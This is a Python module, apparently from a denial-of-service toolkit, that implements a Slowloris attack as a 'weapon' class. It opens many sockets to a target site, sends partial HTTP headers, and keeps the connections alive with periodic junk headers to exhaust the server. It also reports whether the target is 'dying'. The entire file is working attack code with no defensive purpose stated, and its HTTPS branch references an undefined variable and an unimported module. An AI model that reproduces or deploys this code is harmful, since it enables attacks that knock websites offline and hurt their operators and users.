
import app.net
from . import Weapon, WeaponFactory
import random
import socket
import time
import urllib


class SlowLorisFactory(WeaponFactory):

    def __init__(self, **kwargs):
        WeaponFactory.__init__(self, **kwargs)

        self._num_sockets = kwargs['num_sockets'] if 'num_sockets' in kwargs else 100

    def make(self):

        return SlowLorisWeapon(
            http_method=self._http_method,
            cache_buster=self._cache_buster,
            num_sockets=self._num_sockets
        )


class SlowLorisWeapon(Weapon):

    def __init__(self, **kwargs):
        Weapon.__init__(self, **kwargs)

        self._num_sockets = kwargs['num_sockets'] if 'num_sockets' in kwargs else 100

        self._is_initialised = False

        # all of the sockets currently connected to the target
        self._sockets = []

    def _spawn_socket(self, target_url):
        """
        Create a new socket connected to the given URL
        :param target_url: The URL of the site to connect to
        """

        # parse the URL / domain so we can connect to the directly to the domain
        scheme, netloc, path, params, query, fragment = urllib.parse.urlparse(target_url)
        if netloc == '':
            netloc, path = path, ''

        # set up socket

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)

        if scheme == 'https':
            sock = ssl.wrap_socket(s)

        # connect to remote server

        ip = socket.gethostbyname(netloc)

        port = 80
        if scheme == 'https':
            port = 443

        sock.connect((ip, port))

        # send connection HTTP headers

        http_line = ""
        if self._cache_buster:

            http_line = "%s /?%d HTTP/1.1\r\n" % (
                self._http_method, random.randint(0, 2000)
            )

        else:

            http_line = "%s / HTTP/1.1\r\n" % self._http_method

        sock.send(
            http_line.encode("utf-8")
        )

        header_str = "Host: %s\r\n" % netloc
        sock.send(
            header_str.encode("utf-8")
        )

        header_str = "User-Agent: %s\r\n" % app.net.get_user_agent()
        sock.send(
            header_str.encode("utf-8")
        )

        header_str = "Accept-language: en-US,en,q=0.5\r\n"
        sock.send(
            header_str.encode("utf-8")
        )

        return sock

    def attack(self, target_url):

        # send keep-alive headers to each of the sockets
        for sock in self._sockets:

            try:

                keep_alive_header = "X-a: %d\r\n" % random.randint(1, 5000)

                sock.send(
                    keep_alive_header.encode("utf-8")
                )

            except socket.error:

                self._sockets.remove(sock)

        # spawn sockets up to our maximum number
        for i in range(len(self._sockets), self._num_sockets):

            try:

                self._sockets.append(
                    self._spawn_socket(target_url)
                )

            except socket.error as ex:
                # if there is an error, just skip it

                break

        # log # sockets once initialised, so user knows we are ready to roll
        if not self._is_initialised:
            app.console.log("%d sockets spawned\n" % len(self._sockets))
            self._is_initialised = True

        # wait a few seconds before we send headers again
        time.sleep(13)

        # return a fake HTTP header based on whether our sockets are dying or not
        # 200 = OK, site is alive, 429 = too many connections, site is dying
        status_code = 200 if len(self._sockets) >= self._num_sockets else 429

        return status_code
